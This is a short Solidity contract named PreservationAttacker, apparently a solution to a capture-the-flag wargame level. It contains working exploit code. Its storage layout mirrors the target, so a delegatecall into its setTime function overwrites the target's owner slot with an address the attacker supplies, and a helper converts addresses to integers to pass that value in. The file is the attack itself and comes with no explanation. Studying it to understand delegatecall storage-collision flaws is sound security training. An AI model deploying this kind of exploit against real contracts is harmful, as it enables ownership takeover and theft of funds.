// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttacker {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _ownerAddressAsUint) public {
    owner = address(_ownerAddressAsUint);
  }

  function getAdressAsUint(address _address) public pure returns (uint){
    return uint(_address);
  }
}
